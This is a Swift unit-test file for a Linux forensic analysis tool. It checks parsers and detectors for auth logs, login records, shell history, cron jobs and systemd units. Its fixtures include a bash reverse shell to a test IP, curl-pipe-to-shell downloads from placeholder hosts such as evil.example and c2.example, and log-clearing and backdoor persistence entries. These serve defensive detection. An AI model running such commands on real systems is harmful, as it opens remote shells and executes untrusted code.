//
//  LinuxArtifactTests.swift
//  StrataTests
//
//  Covers the Linux artifact layer: the pure parsers (auth.log syslog lines
//  incl. year inference, binary utmp, shell history, cron/systemd, host-info
//  files), their timeline projections, and the three Linux analyzers.
//

import Testing
import Foundation
@testable import Strata

// MARK: - Auth log parser

struct AuthLogParserTests {

    private static let jan2026 = Date(timeIntervalSince1970: 1_767_225_600) // 2026-01-01 UTC

    @Test func parsesAcceptedPassword() throws {
        let entry = try #require(AuthLogParser.parseLine(
            "Mar 12 13:01:02 web01 sshd[1234]: Accepted password for jane from 10.0.0.5 port 51234 ssh2",
            sourceFile: "/var/log/auth.log",
            anchor: Date(timeIntervalSince1970: 1_775_000_000)))   // Apr 2026
        #expect(entry.kind == .sshAccepted)
        #expect(entry.host == "web01")
        #expect(entry.process == "sshd")
        #expect(entry.pid == 1234)
        #expect(entry.user == "jane")
        #expect(entry.sourceIP == "10.0.0.5")
        #expect(entry.port == 51234)
        #expect(entry.method == "password")
        #expect(entry.timestamp != nil)
    }

    @Test func parsesFailedAndInvalidUser() throws {
        let failed = try #require(AuthLogParser.parseLine(
            "Mar 12 13:01:02 web01 sshd[99]: Failed password for invalid user admin from 203.0.113.9 port 40000 ssh2",
            sourceFile: "/var/log/auth.log", anchor: Self.jan2026))
        #expect(failed.kind == .sshFailed)
        #expect(failed.user == "admin")
        #expect(failed.sourceIP == "203.0.113.9")

        let invalid = try #require(AuthLogParser.parseLine(
            "Mar 12 13:01:03 web01 sshd[99]: Invalid user oracle from 203.0.113.9 port 40001",
            sourceFile: "/var/log/auth.log", anchor: Self.jan2026))
        #expect(invalid.kind == .sshInvalidUser)
        #expect(invalid.user == "oracle")
    }

    @Test func parsesSudoAndUseradd() throws {
        let sudo = try #require(AuthLogParser.parseLine(
            "Jun  1 09:00:00 web01 sudo:     jane : TTY=pts/0 ; PWD=/home/jane ; USER=root ; COMMAND=/usr/bin/id",
            sourceFile: "/var/log/auth.log",
            anchor: Date(timeIntervalSince1970: 1_780_000_000)))
        #expect(sudo.kind == .sudo)
        #expect(sudo.user == "jane")
        #expect(sudo.command == "/usr/bin/id")

        let added = try #require(AuthLogParser.parseLine(
            "Jun  1 09:05:00 web01 useradd[800]: new user: name=eve, UID=1002, GID=1002, home=/home/eve, shell=/bin/bash",
            sourceFile: "/var/log/auth.log",
            anchor: Date(timeIntervalSince1970: 1_780_000_000)))
        #expect(added.kind == .userAdded)
        #expect(added.user == "eve")
    }

    @Test func infersYearAcrossRollover() throws {
        // A December entry read against a January mtime belongs to LAST year.
        let janAnchor = Self.jan2026   // 2026-01-01
        let entry = try #require(AuthLogParser.parseLine(
            "Dec 28 10:00:00 web01 sshd[1]: Accepted publickey for root from 10.0.0.1 port 22 ssh2",
            sourceFile: "/var/log/auth.log", anchor: janAnchor))
        var cal = Calendar(identifier: .gregorian)
        cal.timeZone = TimeZone(identifier: "UTC")!
        #expect(cal.component(.year, from: try #require(entry.timestamp)) == 2025)
    }

    @Test func parsesRFC3339Format() throws {
        let entry = try #require(AuthLogParser.parseLine(
            "2026-06-10T12:00:00.000000+00:00 web01 sshd[5]: Accepted publickey for jane from 10.0.0.9 port 22 ssh2",
            sourceFile: "/var/log/auth.log"))
        #expect(entry.kind == .sshAccepted)
        #expect(entry.timestamp == Date(timeIntervalSince1970: 1_781_092_800))
    }

    @Test func rejectsNonSyslogLines() {
        #expect(AuthLogParser.parseLine("not a log line", sourceFile: "/x") == nil)
        #expect(AuthLogParser.parseLine("", sourceFile: "/x") == nil)
    }
}

// MARK: - utmp parser

struct UtmpParserTests {

    /// Build one 384-byte utmp record.
    private static func record(type: UInt16, pid: UInt32 = 100, line: String,
                               user: String, host: String, epoch: UInt32) -> Data {
        var data = Data(count: UtmpParser.recordSize)
        func putLE(_ value: UInt32, at offset: Int) {
            for i in 0..<4 { data[offset + i] = UInt8((value >> (8 * i)) & 0xFF) }
        }
        data[0] = UInt8(type & 0xFF); data[1] = UInt8(type >> 8)
        putLE(pid, at: 4)
        func putString(_ s: String, at offset: Int, width: Int) {
            for (i, b) in s.utf8.prefix(width).enumerated() { data[offset + i] = b }
        }
        putString(line, at: 8, width: 32)
        putString(user, at: 44, width: 32)
        putString(host, at: 76, width: 256)
        putLE(epoch, at: 340)
        return data
    }

    @Test func parsesUserProcessRecord() {
        let data = Self.record(type: 7, pid: 4242, line: "pts/0", user: "jane",
                               host: "10.0.0.5", epoch: 1_700_000_000)
        let records = UtmpParser.parse(data: data, sourceFile: "/var/log/wtmp",
                                       isFailedLogin: false)
        #expect(records.count == 1)
        let r = records[0]
        #expect(r.type == .userProcess)
        #expect(r.pid == 4242)
        #expect(r.line == "pts/0")
        #expect(r.user == "jane")
        #expect(r.host == "10.0.0.5")
        #expect(r.timestamp == Date(timeIntervalSince1970: 1_700_000_000))
        #expect(!r.isFailedLogin)
    }

    @Test func btmpRecordsAreFailedLogins() {
        let data = Self.record(type: 6, line: "ssh:notty", user: "root",
                               host: "203.0.113.9", epoch: 1_700_000_100)
        let records = UtmpParser.parse(data: data, sourceFile: "/var/log/btmp",
                                       isFailedLogin: true)
        #expect(records.count == 1)
        #expect(records[0].isFailedLogin)
        #expect(records[0].type == .loginProcess)
    }

    @Test func skipsZeroedSlotsAndTruncatedTail() {
        var data = Data(count: UtmpParser.recordSize)          // zeroed record
        data.append(Self.record(type: 2, line: "~", user: "reboot",
                                host: "6.8.0-39-generic", epoch: 1_700_000_000))
        data.append(Data(count: 100))                          // truncated tail
        let records = UtmpParser.parse(data: data, sourceFile: "/var/log/wtmp",
                                       isFailedLogin: false)
        #expect(records.count == 1)
        #expect(records[0].type == .bootTime)
    }
}

// MARK: - Shell history parser

struct ShellHistoryParserTests {

    @Test func parsesZshExtendedHistory() {
        let text = ": 1700000000:0;curl http://evil.sh | bash\n: 1700000300:2;ls -la\nplain command\n"
        let entries = ShellHistoryParser.parse(text: text, user: "jane", shell: .zsh,
                                               sourceFile: "/home/jane/.zsh_history")
        #expect(entries.count == 3)
        #expect(entries[0].command == "curl http://evil.sh | bash")
        #expect(entries[0].timestamp == Date(timeIntervalSince1970: 1_700_000_000))
        #expect(entries[2].command == "plain command")
        #expect(entries[2].timestamp == nil)
    }

    @Test func parsesBashHistTimeFormat() {
        let text = "#1700000000\nwhoami\nid\n#9\nnot-a-timestamp-comment\n"
        let entries = ShellHistoryParser.parse(text: text, user: "root", shell: .bash,
                                               sourceFile: "/root/.bash_history")
        // "#9" is below any plausible epoch: kept as a literal command line.
        #expect(entries.map(\.command) == ["whoami", "id", "#9", "not-a-timestamp-comment"])
        #expect(entries[0].timestamp == Date(timeIntervalSince1970: 1_700_000_000))
        #expect(entries[1].timestamp == nil)   // stamp applies to ONE command
    }

    @Test func derivesUserFromPath() {
        #expect(ShellHistoryParser.user(fromPath: "/home/jane/.bash_history") == "jane")
        #expect(ShellHistoryParser.user(fromPath: "/root/.zsh_history") == "root")
        // macOS home directories live under /Users/.
        #expect(ShellHistoryParser.user(fromPath: "/Users/jane/.zsh_history") == "jane")
        #expect(ShellHistoryParser.user(fromPath: "/weird/place") == "?")
    }
}

// MARK: - Persistence parser

struct LinuxPersistenceParserTests {

    @Test func parsesSystemCrontabWithUserField() {
        let text = """
        # /etc/crontab: system-wide crontab
        SHELL=/bin/sh
        PATH=/usr/local/sbin:/usr/local/bin

        17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly
        @reboot root /tmp/.hidden/backdoor.sh
        """
        // Tabs in real crontabs: normalize - the parser splits on spaces.
        let normalized = text.replacingOccurrences(of: "\t", with: " ")
        let entries = LinuxPersistenceParser.parseCrontab(
            text: normalized, sourceFile: "/etc/crontab", hasUserField: true)
        #expect(entries.count == 2)
        #expect(entries[0].schedule == "17 * * * *")
        #expect(entries[0].user == "root")
        #expect(entries[0].command.hasPrefix("cd /"))
        #expect(entries[1].schedule == "@reboot")
        #expect(entries[1].command == "/tmp/.hidden/backdoor.sh")
    }

    @Test func parsesSpoolCrontabWithoutUserField() {
        let entries = LinuxPersistenceParser.parseCrontab(
            text: "*/5 * * * * /usr/bin/php /var/www/cron.php\n",
            sourceFile: "/var/spool/cron/crontabs/www-data",
            hasUserField: false, defaultUser: "www-data")
        #expect(entries.count == 1)
        #expect(entries[0].user == "www-data")
        #expect(entries[0].schedule == "*/5 * * * *")
        #expect(entries[0].command == "/usr/bin/php /var/www/cron.php")
    }

    @Test func parsesSystemdUnit() throws {
        let text = """
        [Unit]
        Description=Totally Legit Service

        [Service]
        User=root
        ExecStart=-/dev/shm/.svc/run.sh --daemon
        Restart=always

        [Install]
        WantedBy=multi-user.target
        """
        let unit = try #require(LinuxPersistenceParser.parseSystemdUnit(
            text: text, sourceFile: "/etc/systemd/system/legit.service"))
        #expect(unit.kind == .systemdService)
        #expect(unit.unitName == "legit.service")
        #expect(unit.detail == "Totally Legit Service")
        #expect(unit.user == "root")
        // The "-" exec prefix is stripped.
        #expect(unit.command == "/dev/shm/.svc/run.sh --daemon")
    }

    @Test func unitWithoutExecStartIsNil() {
        #expect(LinuxPersistenceParser.parseSystemdUnit(
            text: "[Unit]\nDescription=alias only\n",
            sourceFile: "/etc/systemd/system/x.service") == nil)
    }
}

// MARK: - Host info

struct LinuxHostInfoTests {

    @Test func buildsHostInfoAndProfile() {
        var info = LinuxHostInfo()
        LinuxHostInfoParser.applyOSRelease("""
        PRETTY_NAME="Ubuntu 22.04.4 LTS"
        ID=ubuntu
        VERSION_ID="22.04"
        """, to: &info)
        LinuxHostInfoParser.applyHostname("web01\n", to: &info)
        LinuxHostInfoParser.applyTimezone("Europe/Malta\n", to: &info)
        LinuxHostInfoParser.applyPasswd("""
        root:x:0:0:root:/root:/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        jane:x:1000:1000:Jane:/home/jane:/bin/bash
        eve:x:1001:1001::/home/eve:/bin/zsh
        nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
        """, to: &info)

        #expect(info.prettyName == "Ubuntu 22.04.4 LTS")
        #expect(info.hostname == "web01")
        #expect(info.timeZone == "Europe/Malta")
        #expect(info.users.count == 5)

        let profile = HostProfile.derive(fromLinux: info)
        #expect(profile.hostname == "web01")
        #expect(profile.osProductName == "Ubuntu 22.04.4 LTS")
        #expect(profile.primaryUser == "jane")   // lowest human UID with a shell
        #expect(profile.hasAnyData)
    }
}

// MARK: - Timeline projections

struct LinuxTimelineTests {

    @Test func projectsLinuxSourcesAndDropsUndated() {
        let auth = [AuthLogEntry(timestamp: Date(timeIntervalSince1970: 100), host: "h",
                                 process: "sshd", kind: .sshAccepted, message: "Accepted",
                                 sourceFile: "/var/log/auth.log"),
                    AuthLogEntry(timestamp: nil, host: "h", process: "sshd",
                                 kind: .other, message: "x", sourceFile: "/var/log/auth.log")]
        let authEvents = TimelineBuilder.build(from: auth)
        #expect(authEvents.count == 1)
        #expect(authEvents[0].source == .authlog)

        let logins = [UtmpRecord(type: .userProcess, pid: 1, line: "pts/0", user: "jane",
                                 host: "10.0.0.5", timestamp: Date(timeIntervalSince1970: 200),
                                 isFailedLogin: false, sourceFile: "/var/log/wtmp")]
        let loginEvents = TimelineBuilder.build(from: logins)
        #expect(loginEvents.count == 1)
        #expect(loginEvents[0].source == .logins)
        #expect(loginEvents[0].path.contains("jane"))

        let history = [ShellHistoryEntry(user: "jane", shell: .zsh, command: "ls",
                                         timestamp: Date(timeIntervalSince1970: 300),
                                         lineNumber: 1, sourceFile: "/h"),
                       ShellHistoryEntry(user: "jane", shell: .bash, command: "undated",
                                         lineNumber: 2, sourceFile: "/h")]
        let historyEvents = TimelineBuilder.build(from: history)
        #expect(historyEvents.count == 1)   // undated bash entries stay off the timeline
        #expect(historyEvents[0].source == .shellHistory)
    }
}

// MARK: - Analyzers

struct LinuxAnalyzerTests {

    private static func context(authLog: [AuthLogEntry] = [], logins: [UtmpRecord] = [],
                                shellHistory: [ShellHistoryEntry] = [],
                                persistence: [LinuxPersistenceEntry] = []) -> AnalysisContext {
        AnalysisContext(files: [], events: [], timeline: [], registryValues: [],
                        authLog: authLog, logins: logins, shellHistory: shellHistory,
                        linuxPersistence: persistence)
    }

    private static func failed(_ ip: String, user: String, t: TimeInterval) -> AuthLogEntry {
        AuthLogEntry(timestamp: Date(timeIntervalSince1970: t), host: "web01",
                     process: "sshd", kind: .sshFailed, user: user, sourceIP: ip,
                     message: "Failed password for \(user) from \(ip)",
                     sourceFile: "/var/log/auth.log")
    }

    @Test func bruteForceBurstYieldsOneFindingPerIP() {
        let entries = (0..<12).map { Self.failed("203.0.113.9", user: "user\($0)", t: Double($0)) }
            + [Self.failed("10.0.0.1", user: "jane", t: 50)]   // below threshold
        let findings = AuthLogAnalyzer().analyze(context: Self.context(authLog: entries))
        let brute = findings.filter { $0.title.contains("brute force") }
        #expect(brute.count == 1)
        #expect(brute[0].title.contains("203.0.113.9"))
        // 12 distinct usernames -> spraying, high.
        #expect(brute[0].severity == .high)
        #expect(brute[0].technique?.attackID == "T1110.003")
    }

    @Test func acceptedAfterFailuresIsCritical() {
        var entries = (0..<10).map { Self.failed("203.0.113.9", user: "root", t: Double($0)) }
        entries.append(AuthLogEntry(timestamp: Date(timeIntervalSince1970: 100), host: "web01",
                                    process: "sshd", kind: .sshAccepted, user: "root",
                                    sourceIP: "203.0.113.9", method: "password",
                                    message: "Accepted password for root from 203.0.113.9",
                                    sourceFile: "/var/log/auth.log"))
        let findings = AuthLogAnalyzer().analyze(context: Self.context(authLog: entries))
        #expect(findings.contains { $0.severity == .critical && $0.title.contains("SUCCEEDED") })
        // The accepted root login also fires the root-SSH rule.
        #expect(findings.contains { $0.title.contains("root SSH") })
    }

    @Test func btmpOnlyFailuresStillCount() {
        let records = (0..<11).map { i in
            UtmpRecord(type: .loginProcess, pid: 1, line: "ssh:notty", user: "admin",
                       host: "198.51.100.7", timestamp: Date(timeIntervalSince1970: Double(i)),
                       isFailedLogin: true, sourceFile: "/var/log/btmp")
        }
        let findings = AuthLogAnalyzer().analyze(context: Self.context(logins: records))
        #expect(findings.contains { $0.title.contains("198.51.100.7") })
    }

    @Test func userCreationIsFlagged() {
        let entry = AuthLogEntry(timestamp: Date(timeIntervalSince1970: 5), host: "web01",
                                 process: "useradd", kind: .userAdded, user: "eve",
                                 message: "new user: name=eve, UID=1002",
                                 sourceFile: "/var/log/auth.log")
        let findings = AuthLogAnalyzer().analyze(context: Self.context(authLog: [entry]))
        #expect(findings.contains { $0.technique?.attackID == "T1136.001" })
    }

    @Test func shellHistoryRulesFireAndAggregate() {
        func cmd(_ c: String, line: Int) -> ShellHistoryEntry {
            ShellHistoryEntry(user: "jane", shell: .bash, command: c,
                              lineNumber: line, sourceFile: "/home/jane/.bash_history")
        }
        let entries = [
            cmd("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", line: 1),
            cmd("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", line: 2),   // duplicate -> 1 finding
            cmd("curl http://evil.example/x.sh | bash", line: 3),
            cmd("history -c", line: 4),
            cmd("ls -la", line: 5),                                       // benign
            cmd("curl https://example.com/page", line: 6),                // bare curl: benign
        ]
        let findings = ShellHistoryAnalyzer().analyze(context: Self.context(shellHistory: entries))
        #expect(findings.count == 3)
        let reverse = findings.first { $0.title.contains("Reverse") }
        #expect(reverse?.detail.contains("2×") == true)
        #expect(findings.contains { $0.technique?.attackID == "T1105" })
        #expect(findings.contains { $0.technique?.attackID == "T1070.003" })
    }

    @Test func persistenceRules() {
        let entries = [
            LinuxPersistenceEntry(kind: .cron, schedule: "*/5 * * * *", user: "root",
                                  command: "curl http://c2.example/i.sh | sh",
                                  sourceFile: "/etc/crontab"),
            LinuxPersistenceEntry(kind: .cron, schedule: "@reboot", user: "jane",
                                  command: "/usr/local/bin/sync-notes",
                                  sourceFile: "/var/spool/cron/crontabs/jane"),
            LinuxPersistenceEntry(kind: .cron, schedule: "0 3 * * *", user: "root",
                                  command: "/usr/sbin/logrotate /etc/logrotate.conf",
                                  sourceFile: "/etc/crontab"),
            LinuxPersistenceEntry(kind: .systemdService, user: nil,
                                  command: "/dev/shm/.svc/run.sh",
                                  unitName: "legit.service",
                                  sourceFile: "/etc/systemd/system/legit.service"),
        ]
        let findings = LinuxPersistenceAnalyzer().analyze(context: Self.context(persistence: entries))
        #expect(findings.count == 3)   // benign logrotate cron not flagged
        #expect(findings.contains { $0.technique?.attackID == "T1053.003" && $0.severity == .high })
        #expect(findings.contains { $0.title.contains("@reboot") || $0.detail.contains("@reboot") })
        #expect(findings.contains { $0.technique?.attackID == "T1543.002" })
    }
}
